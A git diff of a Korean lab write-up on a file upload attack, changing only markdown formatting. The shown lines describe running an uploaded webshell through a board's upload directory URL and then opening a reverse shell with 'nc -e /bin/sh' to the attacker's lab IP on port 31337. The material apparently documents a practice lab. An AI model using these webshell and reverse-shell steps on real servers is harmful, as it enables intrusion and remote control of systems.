@@ -67,7 +67,7 @@ VMware NAT 방식에서 공격대상과 공격자 IP는 다음과 같다.
 
 > 3.3. Webshell 실행
 
-<2.2. 파일 업로드 경로> 에서 알아낸 파일 업로드 경로를 참고하여 다음의 url 을 통해 webshell 을 실행시킨다.
+`2.2. 파일 업로드 경로` 에서 알아낸 파일 업로드 경로를 참고하여 다음의 url 을 통해 webshell 을 실행시킨다.
 
 http://10.10.10.10/wizboard/table/root/board04/updir/shell.php.kr
 
@@ -127,8 +127,8 @@ cmd 창을 2개 생성 후 다음과 같이 명령어를 입력한다.<br>
 
 > 4.2. 웹쉘을 통해 서버 -> 공격대상 PC 연결시킨다.
 
--`웹쉘` : nc -e /bin/sh 10.10.10.1 31337<br>
-(이때, 10.10.10.1 은 공격자의 IP 주소이다.)<br>
+- `웹쉘` : nc -e /bin/sh 10.10.10.1 31337<br>
+(이때, 10.10.10.1 은 공격자의 IP 주소이다.)
 - `cmd_1` : id (연결확인)
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/4.2.png"></p></center>
